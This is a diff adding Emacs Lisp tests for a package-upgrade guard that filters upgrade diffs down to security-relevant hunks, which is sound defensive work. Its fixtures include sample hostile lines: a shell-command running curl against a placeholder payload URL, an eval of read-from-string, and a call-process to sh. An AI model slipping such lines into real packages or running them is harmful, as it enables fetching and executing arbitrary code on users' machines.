@@ -158,6 +158,60 @@ DIR is used as the descriptor's installed directory when non-nil."
      (package-upgrade-guard--unapproved-menu-entry-p
       ?D other-desc nil (list new-desc) '(pkg)))))
 
+(ert-deftest package-upgrade-guard-security-diff-filters-unified-hunks ()
+  "Security diff mode should keep only hunks with matching changed lines."
+  (let* ((package-upgrade-guard-diff-mode 'security)
+         (diff-content
+          (concat
+           "--- old.el\n"
+           "+++ new.el\n"
+           "@@ -1,3 +1,3 @@\n"
+           " (message \"safe\")\n"
+           "-(setq old 1)\n"
+           "+(setq new 2)\n"
+           "@@ -10,3 +10,3 @@\n"
+           " (message \"review\")\n"
+           "-(message \"old\")\n"
+           "+(shell-command \"curl https://example.invalid/payload\")\n"))
+         (filtered
+          (package-upgrade-guard--filter-security-unified-diff diff-content)))
+    (should (string-match-p "shell-command" filtered))
+    (should-not (string-match-p "setq new" filtered))))
+
+(ert-deftest package-upgrade-guard-security-diff-keeps-matching-file-header ()
+  "Security diff mode should keep the header for each matching git file diff."
+  (let* ((diff-content
+          (concat
+           "diff --git a/safe.el b/safe.el\n"
+           "index 1111111..2222222 100644\n"
+           "--- a/safe.el\n"
+           "+++ b/safe.el\n"
+           "@@ -1 +1 @@\n"
+           "-(message \"old\")\n"
+           "+(message \"new\")\n"
+           "diff --git a/risky.el b/risky.el\n"
+           "index 3333333..4444444 100644\n"
+           "--- a/risky.el\n"
+           "+++ b/risky.el\n"
+           "@@ -1 +1 @@\n"
+           "-(message \"old\")\n"
+           "+(eval (read-from-string payload))\n"))
+         (filtered
+          (package-upgrade-guard--filter-security-unified-diff diff-content)))
+    (should (string-match-p "diff --git a/risky.el b/risky.el" filtered))
+    (should (string-match-p "index 3333333" filtered))
+    (should-not (string-match-p "safe.el" filtered))))
+
+(ert-deftest package-upgrade-guard-security-diff-detects-new-file-lines ()
+  "Security diff mode should show matching lines from new files."
+  (let ((package-upgrade-guard-diff-mode 'security))
+    (should
+     (string-match-p
+      "call-process"
+      (package-upgrade-guard--security-content-lines
+       "(message \"safe\")\n(call-process \"sh\" nil nil nil \"-c\" \"id\")"
+       "+")))))
+
 (provide 'package-upgrade-guard-tests)
 
 ;;; package-upgrade-guard-tests.el ends here
